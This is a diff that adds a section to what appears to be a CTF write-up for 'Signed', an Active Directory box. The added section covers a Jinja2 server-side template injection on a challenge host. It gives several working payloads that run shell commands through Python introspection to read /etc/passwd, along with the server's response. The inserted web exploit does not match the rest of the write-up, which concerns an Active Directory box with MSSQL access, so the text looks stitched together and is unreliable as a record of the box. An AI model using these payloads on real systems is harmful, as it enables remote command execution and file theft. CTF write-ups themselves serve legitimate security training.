@@ -17,6 +17,56 @@ Signed is a medium-difficulty Active Directory box created by kavigihan. It invo
 
 ---
 
+## Vulnerability: Server-Side Template Injection (SSTI) - Jinja2
+
+### SSTI on Email Input
+
+The application contains a **Server-Side Template Injection (SSTI)** vulnerability in the email input field on the `/render` endpoint. The vulnerability allows us to inject Jinja2 template expressions.
+
+**Initial Request:**
+```http
+POST /render HTTP/1.1
+Host: chall.0xfun.org:23371
+Content-Type: application/x-www-form-urlencoded
+
+email={{7*7}}@gmail.com
+```
+
+The application renders the template and processes the expression `{{7*7}}`, confirming the SSTI vulnerability.
+
+**Exploitation - Reading `/etc/passwd`:**
+
+To read the `/etc/passwd` file, we use Jinja2's object introspection to access Python built-in functions and read files:
+
+```http
+POST /render HTTP/1.1
+Host: chall.0xfun.org:23371
+Content-Type: application/x-www-form-urlencoded
+
+email={{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}@gmail.com
+```
+
+**Alternative payload (more reliable):**
+```
+email={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}@gmail.com
+```
+
+**Shorter payload using Jinja2 built-in filters:**
+```
+email={{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}@gmail.com
+```
+
+**Response:**
+The server renders the template and returns the contents of `/etc/passwd`:
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+---
+
 ## Enumeration & Initial Access
 
 The user scott has access to the MSSQL server.
